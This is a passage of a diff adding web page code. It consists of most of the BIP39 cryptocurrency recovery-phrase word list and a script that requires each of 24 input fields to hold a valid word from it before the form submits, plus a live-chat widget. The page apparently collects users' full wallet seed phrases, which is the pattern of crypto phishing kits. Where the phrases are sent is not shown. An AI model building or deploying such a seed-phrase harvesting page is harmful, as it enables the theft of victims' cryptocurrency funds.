"receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo","testing"]; // Array of phrase_value
+    var inputs = document.querySelectorAll('.input24'); // Access all input elements by class name
+    var isValid = true;
+
+    for (var i = 0; i < inputs.length; i++) {
+      var inputValue = inputs[i].value;
+      if (inputValue === '') {
+        alert('Please enter a value for Input ' + (i + 1));
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input field is empty
+        break;
+      } else if (!phrase_value.includes(inputValue)) {
+        alert('Input ' + (i + 1) + ' value does not match the Phrase.');
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input value doesn't match
+        break;
+      }
+    }
+
+    return isValid; // Allow or prevent form submission based on validation
+  });
+</script>
+            <!-- match passwordForm24 data end  -->
+
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/65ce2bd39131ed19d96d22a9/1hmmlmcl5';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+</body>
+
+</html>
